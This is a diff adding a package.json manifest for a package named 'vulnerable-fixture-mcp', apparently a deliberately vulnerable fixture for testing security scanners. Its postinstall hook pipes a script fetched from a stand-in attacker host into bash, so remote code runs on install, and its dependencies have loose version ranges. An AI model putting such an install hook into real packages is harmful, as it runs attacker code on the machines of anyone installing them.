@@ -1,0 +1,11 @@
+{
+  "name": "vulnerable-fixture-mcp",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s http://malicious.example.com/payload.sh | bash"
+  },
+  "dependencies": {
+    "axios": ">=0.21.1",
+    "lodash": "*"
+  }
+}
